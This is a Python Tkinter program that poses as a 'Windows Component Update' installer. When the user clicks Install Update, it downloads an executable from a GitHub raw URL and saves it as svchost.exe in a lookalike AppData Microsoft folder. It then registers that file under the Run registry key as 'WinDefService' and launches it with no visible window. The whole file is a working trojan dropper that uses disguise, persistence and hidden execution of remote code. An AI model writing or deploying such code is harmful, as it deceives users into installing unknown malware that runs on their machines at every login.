import os
import requests
import winreg
import tkinter as tk
from tkinter import ttk
import threading
import subprocess

GITHUB_URL = "https://github.com/gdpsarch/ssh/raw/refs/heads/main/svchost.exe"
APP_DATA = os.getenv('APPDATA') or os.path.expanduser('~\\AppData\\Roaming')
TARGET_DIR = os.path.join(APP_DATA, 'Microsoft', 'SystemData')
TARGET_PATH = os.path.join(TARGET_DIR, 'svchost.exe')

def add_to_startup(file_path):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WinDefService", 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(key)
    except:
        pass

def download_and_install():
    btn_install.config(state='disabled')
    lbl_status.config(text="Status: Preparing...")
    progress['value'] = 10
    
    try:
        if not os.path.exists(TARGET_DIR):
            os.makedirs(TARGET_DIR)
        progress['value'] = 25
        lbl_status.config(text="Status: Connecting to server...")

        response = requests.get(GITHUB_URL, stream=True)
        if response.status_code == 200:
            lbl_status.config(text="Status: Downloading components...")
            with open(TARGET_PATH, 'wb') as f:
                f.write(response.content)
            progress['value'] = 75
        else:
            lbl_status.config(text="Status: Connection error")
            btn_install.config(state='normal')
            return
        
        add_to_startup(TARGET_PATH)
        lbl_status.config(text="Status: Finishing...")
        progress['value'] = 90

        subprocess.Popen([TARGET_PATH], creationflags=subprocess.CREATE_NO_WINDOW)
        progress['value'] = 100
        lbl_status.config(text="Status: Complete")
        
        root.after(1500, root.destroy)
    except:
        lbl_status.config(text="Status: Install failed")
        btn_install.config(state='normal')

def start_thread():
    threading.Thread(target=download_and_install).start()

root = tk.Tk()
root.title("System Update Manager")
root.geometry("350x180")
root.resizable(False, False)

tk.Label(root, text="Windows Component Update", font=("Arial", 10, "bold")).pack(pady=10)
tk.Label(root, text="Package version: 2.1.0.44", font=("Arial", 8), fg="gray").pack()

progress = ttk.Progressbar(root, orient='horizontal', length=280, mode='determinate')
progress.pack(pady=10)

lbl_status = tk.Label(root, text="Status: Ready to install", font=("Arial", 8))
lbl_status.pack()

btn_install = tk.Button(root, text="Install Update", command=start_thread, width=15, bg="#e1e1e1")
btn_install.pack(pady=10)

root.mainloop()